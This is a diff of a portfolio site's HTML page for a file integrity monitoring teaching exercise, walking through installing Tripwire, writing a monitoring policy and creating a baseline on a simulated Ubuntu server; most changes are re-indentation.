@@ -10,572 +10,635 @@
 </head>
 
 <body>
-    <!-- Header -->
-    <header>
-        <div class="container">
-            <nav>
-                <a href="index.html" class="logo">
-                    <i class="fas fa-shield-alt"></i>
-                    Aziz Alghamdi عزيز الغامدي
-                </a>
-                <ul class="nav-links">
-                      <li><a href="/index.html">Home</a></li>
+<!-- Header -->
+<header>
+    <div class="container">
+        <nav>
+            <a href="index.html" class="logo">
+                <i class="fas fa-shield-alt"></i>
+                Aziz Alghamdi عزيز الغامدي
+            </a>
+            <ul class="nav-links">
+                <li><a href="/index.html">Home</a></li>
                 <li><a href="/index.html#about">About</a></li>
                 <li><a href="/index.html#education">Education</a></li>
                 <li><a href="/index.html#research">Research</a></li>
                 <li><a href="/index.html#projects">Projects</a></li>
                 <li><a href="/index.html#certifications">Certifications</a></li>
                 <li><a href="/index.html#contact">Contact</a></li>
-                </ul>
-            </nav>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<!-- FIM Challenge Section -->
+<section class="fim-section">
+    <div class="container">
+        <h2 class="section-title cyber-accent">File Integrity Monitoring Challenge</h2>
+
+        <div class="fim-intro">
+            <h3>Welcome to the File Integrity Monitoring Challenge</h3>
+            <p>This interactive challenge will teach you how to implement and use file integrity monitoring (FIM)
+                systems like Tripwire to detect unauthorized changes to critical files. You'll learn to set up
+                monitoring, detect modifications, and investigate security incidents.</p>
+
+            <div class="info-box">
+                <h4><i class="fas fa-info-circle"></i> What is File Integrity Monitoring?</h4>
+                <p>File Integrity Monitoring (FIM) is a security process that validates the integrity of operating
+                    system and application files by comparing the current state of files to a known, good baseline. If a
+                    monitored file is changed, added, or deleted, the FIM system alerts security personnel to
+                    investigate the change.</p>
+                <p>FIM is crucial for detecting unauthorized modifications that might indicate a security breach,
+                    malware infection, or insider threat activity.</p>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+
+            <div class="challenge-tabs">
+                <div class="challenge-tab active" data-tab="intro">Introduction</div>
+                <div class="challenge-tab" data-tab="setup">FIM Setup</div>
+                <div class="challenge-tab" data-tab="baseline">Creating Baseline</div>
+                <div class="challenge-tab" data-tab="detection">Change Detection</div>
+                <div class="challenge-tab" data-tab="investigation">Investigation</div>
+                <div class="challenge-tab" data-tab="completion">Completion</div>
+            </div>
+
+            <div id="start-challenge-btn" style="text-align: center; margin-top: 30px;">
+                <button class="btn btn-primary" onclick="startChallenge()">Start FIM Challenge</button>
+            </div>
         </div>
-    </header>
 
-    <!-- FIM Challenge Section -->
-    <section class="fim-section">
-        <div class="container">
-            <h2 class="section-title cyber-accent">File Integrity Monitoring Challenge</h2>
+        <!-- Challenge Content -->
+        <div id="challenge-content" style="display: none;">
+            <!-- Introduction Tab -->
+            <div class="challenge-container challenge-active" id="intro">
+                <h3 style="margin-bottom: 20px;">Understanding File Integrity Monitoring</h3>
 
-            <div class="fim-intro">
-                <h3>Welcome to the File Integrity Monitoring Challenge</h3>
-                <p>This interactive challenge will teach you how to implement and use file integrity monitoring (FIM) systems like Tripwire to detect unauthorized changes to critical files. You'll learn to set up monitoring, detect modifications, and investigate security incidents.</p>
+                <p>File Integrity Monitoring (FIM) systems like Tripwire are essential security tools that help protect
+                    critical systems by:</p>
 
-                <div class="info-box">
-                    <h4><i class="fas fa-info-circle"></i> What is File Integrity Monitoring?</h4>
-                    <p>File Integrity Monitoring (FIM) is a security process that validates the integrity of operating system and application files by comparing the current state of files to a known, good baseline. If a monitored file is changed, added, or deleted, the FIM system alerts security personnel to investigate the change.</p>
-                    <p>FIM is crucial for detecting unauthorized modifications that might indicate a security breach, malware infection, or insider threat activity.</p>
+                <ul style="margin: 20px 0 20px 20px;">
+                    <li>Detecting unauthorized file modifications in real-time or through scheduled scans</li>
+                    <li>Ensuring compliance with security standards like PCI DSS, HIPAA, and SOC 2</li>
+                    <li>Providing evidence for forensic investigations after security incidents</li>
+                    <li>Validating system integrity after patches and updates</li>
+                </ul>
+
+                <div style="display: flex; flex-wrap: wrap; gap: 20px; margin: 30px 0;">
+                    <div style="flex: 1; min-width: 250px; background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
+                        <h4 style="display: flex; align-items: center; margin-bottom: 15px; color: var(--primary-color);">
+                            <i class="fas fa-fingerprint"
+                               style="margin-right: 10px; color: var(--secondary-color);"></i>
+                            How FIM Works
+                        </h4>
+                        <ol style="margin-left: 20px;">
+                            <li><strong>Baseline Creation</strong>: A cryptographic hash (checksum) is calculated for
+                                each monitored file
+                            </li>
+                            <li><strong>Ongoing Monitoring</strong>: New hashes are regularly calculated and compared to
+                                the baseline
+                            </li>
+                            <li><strong>Change Detection</strong>: Any differences trigger alerts for security
+                                investigation
+                            </li>
+                            <li><strong>Reporting</strong>: Detailed information about file changes is provided</li>
+                        </ol>
+                    </div>
+
+                    <div style="flex: 1; min-width: 250px; background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
+                        <h4 style="display: flex; align-items: center; margin-bottom: 15px; color: var(--primary-color);">
+                            <i class="fas fa-cogs" style="margin-right: 10px; color: var(--secondary-color);"></i>
+                            Key FIM Features
+                        </h4>
+                        <ul style="margin-left: 20px;">
+                            <li><strong>Real-time Monitoring</strong>: Immediate detection of suspicious changes</li>
+                            <li><strong>File Attributes</strong>: Tracking permissions, ownership, size, and timestamps
+                            </li>
+                            <li><strong>Whitelisting</strong>: Approving expected changes (e.g., during updates)</li>
+                            <li><strong>Centralized Management</strong>: Monitoring multiple systems from one console
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div style="flex: 1; min-width: 250px; background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
+                        <h4 style="display: flex; align-items: center; margin-bottom: 15px; color: var(--primary-color);">
+                            <i class="fas fa-shield-alt" style="margin-right: 10px; color: var(--secondary-color);"></i>
+                            Common FIM Tools
+                        </h4>
+                        <ul style="margin-left: 20px;">
+                            <li><strong>Tripwire</strong>: One of the original and most widely used FIM solutions</li>
+                            <li><strong>OSSEC</strong>: Open-source host-based intrusion detection with FIM capabilities
+                            </li>
+                            <li><strong>Wazuh</strong>: Fork of OSSEC with enhanced features and integration</li>
+                            <li><strong>File Integrity Monitoring in EDR tools</strong>: CrowdStrike, Carbon Black, etc.
+                            </li>
+                        </ul>
+                    </div>
                 </div>
 
-                <div class="progress-container">
-                    <div class="progress-bar" id="progress-bar"></div>
-                </div>
-
-                <div class="challenge-tabs">
-                    <div class="challenge-tab active" data-tab="intro">Introduction</div>
-                    <div class="challenge-tab" data-tab="setup">FIM Setup</div>
-                    <div class="challenge-tab" data-tab="baseline">Creating Baseline</div>
-                    <div class="challenge-tab" data-tab="detection">Change Detection</div>
-                    <div class="challenge-tab" data-tab="investigation">Investigation</div>
-                    <div class="challenge-tab" data-tab="completion">Completion</div>
-                </div>
-
-                <div id="start-challenge-btn" style="text-align: center; margin-top: 30px;">
-                    <button class="btn btn-primary" onclick="startChallenge()">Start FIM Challenge</button>
+                <div class="warning-box">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Challenge Scenario</h4>
+                    <p>In this challenge, you are a security analyst responsible for protecting critical server
+                        infrastructure. You've been tasked with setting up file integrity monitoring to detect any
+                        unauthorized changes to system files.</p>
+                    <p>During the challenge, you will:</p>
+                    <ol style="margin-top: 10px; margin-left: 20px;">
+                        <li>Configure Tripwire on a simulated Linux server</li>
+                        <li>Create a baseline of critical system files</li>
+                        <li>Detect unauthorized changes made by a potential attacker</li>
+                        <li>Investigate the changes and identify the security implications</li>
+                    </ol>
                 </div>
             </div>
 
-            <!-- Challenge Content -->
-            <div id="challenge-content" style="display: none;">
-                <!-- Introduction Tab -->
-                <div class="challenge-container challenge-active" id="intro">
-                    <h3 style="margin-bottom: 20px;">Understanding File Integrity Monitoring</h3>
+            <!-- FIM Setup Tab -->
+            <div class="challenge-container" id="setup">
+                <h3 style="margin-bottom: 20px;">Setting Up File Integrity Monitoring</h3>
 
-                    <p>File Integrity Monitoring (FIM) systems like Tripwire are essential security tools that help protect critical systems by:</p>
+                <p>Let's begin by setting up Tripwire, a powerful file integrity monitoring solution. Tripwire works by
+                    creating a baseline database of file checksums and then periodically comparing the current state of
+                    files against this baseline to detect changes.</p>
 
-                    <ul style="margin: 20px 0 20px 20px;">
-                        <li>Detecting unauthorized file modifications in real-time or through scheduled scans</li>
-                        <li>Ensuring compliance with security standards like PCI DSS, HIPAA, and SOC 2</li>
-                        <li>Providing evidence for forensic investigations after security incidents</li>
-                        <li>Validating system integrity after patches and updates</li>
+                <div class="task-list">
+                    <div class="task-item">
+                        <div class="task-number">1</div>
+                        <div class="task-content">
+                            <h4>Install Tripwire</h4>
+                            <p>First, we need to install Tripwire on our simulated Ubuntu server:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo apt update</span></div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    Get:1 http://security.ubuntu.com/ubuntu focal-security InRelease [114 kB]<br>
+                                    Get:2 http://archive.ubuntu.com/ubuntu focal InRelease [265 kB]<br>
+                                    Get:3 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]<br>
+                                    [...]<br>
+                                    Reading package lists... Done<br>
+                                    Building dependency tree<br>
+                                    Reading state information... Done<br>
+                                    All packages are up to date.
+                                </div>
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo apt install tripwire</span>
+                                </div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    Reading package lists... Done<br>
+                                    Building dependency tree<br>
+                                    Reading state information... Done<br>
+                                    The following packages will be installed:<br>
+                                    tripwire<br>
+                                    0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.<br>
+                                    Need to get 1,052 kB of archives.<br>
+                                    After this operation, 3,245 kB of additional disk space will be used.<br>
+                                    Get:1 http://archive.ubuntu.com/ubuntu focal/universe amd64 tripwire amd64 2.4.3.7-1
+                                    [1,052 kB]<br>
+                                    Fetched 1,052 kB in 2s (526 kB/s)<br>
+                                    <br>
+                                    During installation, you'll be prompted to set up two passphrases:<br>
+                                    - Site Passphrase: used for the Tripwire site configuration file<br>
+                                    - Local Passphrase: used for the Tripwire database<br>
+                                    <br>
+                                    Setting up tripwire (2.4.3.7-1) ...<br>
+                                    <br>
+                                    Creating configuration file /etc/tripwire/twcfg.txt with new version<br>
+                                    Creating configuration file /etc/tripwire/twpol.txt with new version<br>
+                                    <br>
+                                    ----------------------------------------------------------------------<br>
+                                    The Tripwire site and local passphrases are used to<br>
+                                    sign a variety of files, such as the configuration,<br>
+                                    policy, and database files.<br>
+                                    <br>
+                                    Passphrases must be at least 8 characters long.<br>
+                                    <br>
+                                    See the Tripwire manual for more information.<br>
+                                    ----------------------------------------------------------------------<br>
+                                    <br>
+                                    Creating key files...<br>
+                                    <br>
+                                    (When selecting a passphrase, keep in mind that good passphrases typically<br>
+                                    have upper and lower case letters, digits and punctuation marks, and are<br>
+                                    at least 8 characters in length.)<br>
+                                    <br>
+                                    Enter the site keyfile passphrase: <span style="color: #63E2FF;">********</span><br>
+                                    Verify the site keyfile passphrase: <span
+                                        style="color: #63E2FF;">********</span><br>
+                                    Generating key (this may take several minutes)...Key generation complete.<br>
+                                    <br>
+                                    (When selecting a passphrase, keep in mind that good passphrases typically<br>
+                                    have upper and lower case letters, digits and punctuation marks, and are<br>
+                                    at least 8 characters in length.)<br>
+                                    <br>
+                                    Enter the local keyfile passphrase: <span
+                                        style="color: #63E2FF;">********</span><br>
+                                    Verify the local keyfile passphrase: <span
+                                        style="color: #63E2FF;">********</span><br>
+                                    Generating key (this may take several minutes)...Key generation complete.<br>
+                                    <br>
+                                    Generating Tripwire configuration files...<br>
+                                    <br>
+                                    Processing configuration file...<br>
+                                    <br>
+                                    The configuration file: /etc/tripwire/twcfg.txt<br>
+                                    Wrote configuration file: /etc/tripwire/tw.cfg<br>
+                                    A clear-text version of the Tripwire configuration file has been<br>
+                                    preserved at /etc/tripwire/twcfg.txt.<br>
+                                    <br>
+                                    Processing policy file...<br>
+                                    <br>
+                                    The policy file: /etc/tripwire/twpol.txt<br>
+                                    Wrote policy file: /etc/tripwire/tw.pol<br>
+                                    A clear-text version of the Tripwire policy file has been preserved at<br>
+                                    /etc/tripwire/twpol.txt.<br>
+                                    <br>
+                                    The Tripwire installation is complete.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="task-item">
+                        <div class="task-number">2</div>
+                        <div class="task-content">
+                            <h4>Review Tripwire Configuration</h4>
+                            <p>Tripwire uses two main configuration files:</p>
+                            <ul style="margin: 10px 0 10px 20px;">
+                                <li><strong>twcfg.txt</strong>: Contains system-specific settings like file locations
+                                    and email notification options
+                                </li>
+                                <li><strong>twpol.txt</strong>: Defines which files and directories to monitor and what
+                                    properties to check
+                                </li>
+                            </ul>
+                            <p>Let's examine the default policy file to understand what Tripwire will monitor:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo head -n 30 /etc/tripwire/twpol.txt</span>
+                                </div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    ##############################################################################<br>
+                                    # #<br>
+                                    # Default Tripwire Policy for Ubuntu #<br>
+                                    # #<br>
+                                    ##############################################################################<br>
+                                    <br>
+                                    @@section GLOBAL<br>
+                                    <br>
+                                    TWROOT=/usr/sbin;<br>
+                                    TWBIN=/usr/sbin;<br>
+                                    TWPOL="/etc/tripwire";<br>
+                                    TWDB="/var/lib/tripwire";<br>
+                                    TWSKEY="/etc/tripwire";<br>
+                                    TWLKEY="/etc/tripwire";<br>
+                                    TWREPORT="/var/lib/tripwire/report";<br>
+                                    HOSTNAME=localhost;<br>
+                                    <br>
+                                    @@section FS<br>
+                                    <br>
+                                    # These variables are used to define what properties<br>
+                                    # we will scan for on different file types<br>
+                                    <br>
+                                    # SEC_CRIT Scans for changes to the file properties:<br>
+                                    # permissions, owner, group, size, mtime, ctime, inode<br>
+                                    # links, growing size<br>
+                                    <br>
+                                    # SEC_SUID Scans for changes to the file properties:<br>
+                                    # permissions, owner, group, size, mtime, ctime, inode<br>
+                                    # links, growing size<br>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="task-item">
+                        <div class="task-number">3</div>
+                        <div class="task-content">
+                            <h4>Customize Tripwire Policy</h4>
+                            <p>For this challenge, we'll create a simplified custom policy to monitor specific critical
+                                files and directories. Let's create a custom policy file focused on key system
+                                areas:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo cp /etc/tripwire/twpol.txt /etc/tripwire/twpol.txt.bak</span>
+                                </div>
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo nano /etc/tripwire/twpol.txt.custom</span>
+                                </div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    # Custom Tripwire Policy File for FIM Challenge<br>
+                                    <br>
+                                    @@section GLOBAL<br>
+                                    <br>
+                                    TWROOT=/usr/sbin;<br>
+                                    TWBIN=/usr/sbin;<br>
+                                    TWPOL="/etc/tripwire";<br>
+                                    TWDB="/var/lib/tripwire";<br>
+                                    TWSKEY="/etc/tripwire";<br>
+                                    TWLKEY="/etc/tripwire";<br>
+                                    TWREPORT="/var/lib/tripwire/report";<br>
+                                    HOSTNAME=localhost;<br>
+                                    <br>
+                                    @@section FS<br>
+                                    <br>
+                                    # File property masks<br>
+                                    SEC_CRIT = $(PN) $(PX) $(PALL) -SHa ; # Critical files<br>
+                                    SEC_BIN = $(PN) $(PX) $(PALL) -SHa ; # Binaries<br>
+                                    SEC_CONFIG = $(PN) $(PX) $(PALL) -SHa ; # Config files<br>
+                                    SEC_LOG = $(PN) $(PX) $(PALL) -SHa ; # Log files<br>
+                                    SIG_LOW = 33 ; # Non-critical files<br>
+                                    SIG_MED = 66 ; # User binaries<br>
+                                    SIG_HI = 100 ; # Critical files<br>
+                                    <br>
+                                    @@section POLICY<br>
+                                    <br>
+                                    # Critical system binaries<br>
+                                    {<br>
+                                    /bin -> $(SEC_BIN) (recurse=true) ;<br>
+                                    /sbin -> $(SEC_BIN) (recurse=true) ;<br>
+                                    /usr/bin -> $(SEC_BIN) (recurse=true) ;<br>
+                                    /usr/sbin -> $(SEC_BIN) (recurse=true) ;<br>
+                                    }<br>
+                                    <br>
+                                    # Critical system configuration<br>
+                                    {<br>
+                                    /etc -> $(SEC_CONFIG) (recurse=false) ;<br>
+                                    /etc/passwd -> $(SEC_CRIT) ;<br>
+                                    /etc/shadow -> $(SEC_CRIT) ;<br>
+                                    /etc/group -> $(SEC_CRIT) ;<br>
+                                    /etc/ssh -> $(SEC_CONFIG) (recurse=true) ;<br>
+                                    /etc/tripwire -> $(SEC_CONFIG) (recurse=true) ;<br>
+                                    }<br>
+                                    <br>
+                                    # Web server files (for the challenge)<br>
+                                    {<br>
+                                    /var/www/html -> $(SEC_CONFIG) (recurse=true) ;<br>
+                                    }<br>
+                                </div>
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo cp /etc/tripwire/twpol.txt.custom /etc/tripwire/twpol.txt</span>
+                                </div>
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --update-policy /etc/tripwire/twpol.txt</span>
+                                </div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    Enter your local passphrase: <span style="color: #63E2FF;">********</span><br>
+                                    Parsing policy file: /etc/tripwire/twpol.txt<br>
+                                    Generating signed policy file: /etc/tripwire/tw.pol<br>
+                                    <br>
+                                    Please enter your site passphrase: <span style="color: #63E2FF;">********</span><br>
+                                    <br>
+                                    Wrote policy file: /etc/tripwire/tw.pol<br>
+                                    Policy update complete.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="command-help">
+                    <h4><i class="fas fa-terminal"></i> Key Tripwire Commands</h4>
+                    <div class="command-item">
+                        <span class="command-name">tripwire --init</span>
+                        <p>Initializes the Tripwire database by creating a baseline of the monitored files according to
+                            the policy</p>
+                    </div>
+                    <div class="command-item">
+                        <span class="command-name">tripwire --check</span>
+                        <p>Checks the current state of monitored files against the baseline and generates a report of
+                            any changes</p>
+                    </div>
+                    <div class="command-item">
+                        <span class="command-name">tripwire --update-policy [policy_file]</span>
+                        <p>Updates the Tripwire policy with changes from the specified text policy file</p>
+                    </div>
+                    <div class="command-item">
+                        <span class="command-name">tripwire --update --twrfile [report_file]</span>
+                        <p>Updates the Tripwire database with changes found in the specified report file (used to
+                            acknowledge legitimate changes)</p>
+                    </div>
+                </div>
+
+                <div style="margin-top: 30px; text-align: center;">
+                    <button class="btn btn-primary" onclick="completeSetup()">Complete Setup</button>
+                </div>
+            </div>
+
+            <!-- Creating Baseline Tab -->
+            <div class="challenge-container" id="baseline">
+                <h3 style="margin-bottom: 20px;">Creating the Integrity Baseline</h3>
+
+                <p>Now that we've installed and configured Tripwire, we need to create a baseline of our system's files.
+                    This baseline will serve as the "known good state" against which future file states will be
+                    compared.</p>
+
+                <div class="task-list">
+                    <div class="task-item">
+                        <div class="task-number">1</div>
+                        <div class="task-content">
+                            <h4>Initialize the Tripwire Database</h4>
+                            <p>Let's create the initial baseline database using our custom policy:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --init</span></div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    Please enter your local passphrase: <span
+                                        style="color: #63E2FF;">********</span><br>
+                                    <br>
+                                    Parsing policy file: /etc/tripwire/tw.pol<br>
+                                    Generating the database...<br>
+                                    *** Processing Unix File System ***<br>
+                                    <br>
+                                    ### Phase 1: Reading configuration files<br>
+                                    ### Phase 2: Generating file list<br>
+                                    ### Phase 3: Creating file information database<br>
+                                    ### Phase 4: Searching for invariant files<br>
+                                    ### Phase 5: Pruning unneeded file information<br>
+                                    ### Phase 6: Calculating file hashes<br>
+                                    ### Phase 7: Storing database<br>
+                                    <br>
+                                    Wrote database file: /var/lib/tripwire/localhost.twd<br>
+                                    <br>
+                                    The database was successfully generated.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="task-item">
+                        <div class="task-number">2</div>
+                        <div class="task-content">
+                            <h4>Verify the Initial Database</h4>
+                            <p>Let's run a check immediately after creating the baseline to make sure everything is
+                                working correctly:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --check</span></div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    Please enter your local passphrase: <span
+                                        style="color: #63E2FF;">********</span><br>
+                                    <br>
+                                    Parsing policy file: /etc/tripwire/tw.pol<br>
+                                    *** Processing Unix File System ***<br>
+                                    <br>
+                                    ### Phase 1: Reading configuration files<br>
+                                    ### Phase 2: Generating file list<br>
+                                    ### Phase 3: Creating file information database<br>
+                                    ### Phase 4: Searching for invariant files<br>
+                                    ### Phase 5: Pruning unneeded file information<br>
+                                    ### Phase 6: Calculating file hashes<br>
+                                    ### Phase 7: Comparing database against system<br>
+                                    <br>
+                                    No violations were found. Report generated at:<br>
+                                    /var/lib/tripwire/report/localhost-20250401-121530.twr<br>
+                                </div>
+                            </div>
+                            <p style="margin-top: 15px;">Perfect! There are no violations reported because we just
+                                created the baseline. This means Tripwire is successfully monitoring our files according
+                                to the policy we defined.</p>
+                        </div>
+                    </div>
+
+                    <div class="task-item">
+                        <div class="task-number">3</div>
+                        <div class="task-content">
+                            <h4>Understand What's Being Monitored</h4>
+                            <p>Let's examine what files are being monitored in more detail. We'll look at a key area
+                                defined in our policy - the web server files:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">ls -la /var/www/html/</span></div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    total 28<br>
+                                    drwxr-xr-x 2 www-data www-data 4096 Apr 1 11:30 .<br>
+                                    drwxr-xr-x 3 root root 4096 Apr 1 11:25 ..<br>
+                                    -rw-r--r-- 1 www-data www-data 9172 Apr 1 11:30 index.html<br>
+                                    -rw-r--r-- 1 www-data www-data 2874 Apr 1 11:30 login.php<br>
+                                    -rw-r--r-- 1 www-data www-data 1507 Apr 1 11:30 styles.css<br>
+                                </div>
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">cat /var/www/html/index.html | head -10</span>
+                                </div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    &lt;!DOCTYPE html&gt;<br>
+                                    &lt;html lang="en"&gt;<br>
+                                    &lt;head&gt;<br>
+                                    &lt;meta charset="UTF-8"&gt;<br>
+                                    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;<br>
+                                    &lt;title&gt;Company Internal Portal&lt;/title&gt;<br>
+                                    &lt;link rel="stylesheet" href="styles.css"&gt;<br>
+                                    &lt;/head&gt;<br>
+                                    &lt;body&gt;<br>
+                                    &lt;header&gt;<br>
+                                </div>
+                            </div>
+                            <p style="margin-top: 15px;">These are the web server files that Tripwire is monitoring. Any
+                                changes to these files will be detected during the integrity check.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <h4><i class="fas fa-info-circle"></i> What Tripwire Monitors</h4>
+                    <p>Tripwire can monitor various file properties including:</p>
+                    <ul style="margin-top: 10px; margin-left: 20px;">
+                        <li><strong>File Content</strong>: Detected through cryptographic hash changes (MD5, SHA-1)</li>
+                        <li><strong>Permissions</strong>: File access rights (read, write, execute)</li>
+                        <li><strong>Ownership</strong>: User and group ownership of files</li>
+                        <li><strong>Size</strong>: File size in bytes</li>
+                        <li><strong>Timestamps</strong>: Modification time (mtime), access time (atime), and creation
+                            time (ctime)
+                        </li>
+                        <li><strong>Inode</strong>: The file's reference number in the filesystem</li>
+                        <li><strong>Link Count</strong>: Number of hard links to the file</li>
                     </ul>
-
-                    <div style="display: flex; flex-wrap: wrap; gap: 20px; margin: 30px 0;">
-                        <div style="flex: 1; min-width: 250px; background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
-                            <h4 style="display: flex; align-items: center; margin-bottom: 15px; color: var(--primary-color);">
-                                <i class="fas fa-fingerprint" style="margin-right: 10px; color: var(--secondary-color);"></i>
-                                How FIM Works
-                            </h4>
-                            <ol style="margin-left: 20px;">
-                                <li><strong>Baseline Creation</strong>: A cryptographic hash (checksum) is calculated for each monitored file</li>
-                                <li><strong>Ongoing Monitoring</strong>: New hashes are regularly calculated and compared to the baseline</li>
-                                <li><strong>Change Detection</strong>: Any differences trigger alerts for security investigation</li>
-                                <li><strong>Reporting</strong>: Detailed information about file changes is provided</li>
-                            </ol>
-                        </div>
-
-                        <div style="flex: 1; min-width: 250px; background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
-                            <h4 style="display: flex; align-items: center; margin-bottom: 15px; color: var(--primary-color);">
-                                <i class="fas fa-cogs" style="margin-right: 10px; color: var(--secondary-color);"></i>
-                                Key FIM Features
-                            </h4>
-                            <ul style="margin-left: 20px;">
-                                <li><strong>Real-time Monitoring</strong>: Immediate detection of suspicious changes</li>
-                                <li><strong>File Attributes</strong>: Tracking permissions, ownership, size, and timestamps</li>
-                                <li><strong>Whitelisting</strong>: Approving expected changes (e.g., during updates)</li>
-                                <li><strong>Centralized Management</strong>: Monitoring multiple systems from one console</li>
-                            </ul>
-                        </div>
-
-                        <div style="flex: 1; min-width: 250px; background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
-                            <h4 style="display: flex; align-items: center; margin-bottom: 15px; color: var(--primary-color);">
-                                <i class="fas fa-shield-alt" style="margin-right: 10px; color: var(--secondary-color);"></i>
-                                Common FIM Tools
-                            </h4>
-                            <ul style="margin-left: 20px;">
-                                <li><strong>Tripwire</strong>: One of the original and most widely used FIM solutions</li>
-                                <li><strong>OSSEC</strong>: Open-source host-based intrusion detection with FIM capabilities</li>
-                                <li><strong>Wazuh</strong>: Fork of OSSEC with enhanced features and integration</li>
-                                <li><strong>File Integrity Monitoring in EDR tools</strong>: CrowdStrike, Carbon Black, etc.</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <div class="warning-box">
-                        <h4><i class="fas fa-exclamation-triangle"></i> Challenge Scenario</h4>
-                        <p>In this challenge, you are a security analyst responsible for protecting critical server infrastructure. You've been tasked with setting up file integrity monitoring to detect any unauthorized changes to system files.</p>
-                        <p>During the challenge, you will:</p>
-                        <ol style="margin-top: 10px; margin-left: 20px;">
-                            <li>Configure Tripwire on a simulated Linux server</li>
-                            <li>Create a baseline of critical system files</li>
-                            <li>Detect unauthorized changes made by a potential attacker</li>
-                            <li>Investigate the changes and identify the security implications</li>
-                        </ol>
-                    </div>
+                    <p style="margin-top: 10px;">By monitoring these properties, Tripwire can detect various types of
+                        unauthorized changes, including content modifications, permission changes, and ownership
+                        transfers.</p>
                 </div>
 
-                <!-- FIM Setup Tab -->
-                <div class="challenge-container" id="setup">
-                    <h3 style="margin-bottom: 20px;">Setting Up File Integrity Monitoring</h3>
+                <div style="margin-top: 30px; text-align: center;">
+                    <button class="btn btn-primary" onclick="completeBaseline()">Complete Baseline Creation</button>
+                </div>
+            </div>
 
-                    <p>Let's begin by setting up Tripwire, a powerful file integrity monitoring solution. Tripwire works by creating a baseline database of file checksums and then periodically comparing the current state of files against this baseline to detect changes.</p>
+            <!-- Change Detection Tab -->
+            <div class="challenge-container" id="detection">
+                <h3 style="margin-bottom: 20px;">Detecting Unauthorized Changes</h3>
 
-                    <div class="task-list">
-                        <div class="task-item">
-                            <div class="task-number">1</div>
-                            <div class="task-content">
-                                <h4>Install Tripwire</h4>
-                                <p>First, we need to install Tripwire on our simulated Ubuntu server:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
-                                </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo apt update</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        Get:1 http://security.ubuntu.com/ubuntu focal-security InRelease [114 kB]<br>
-                                        Get:2 http://archive.ubuntu.com/ubuntu focal InRelease [265 kB]<br>
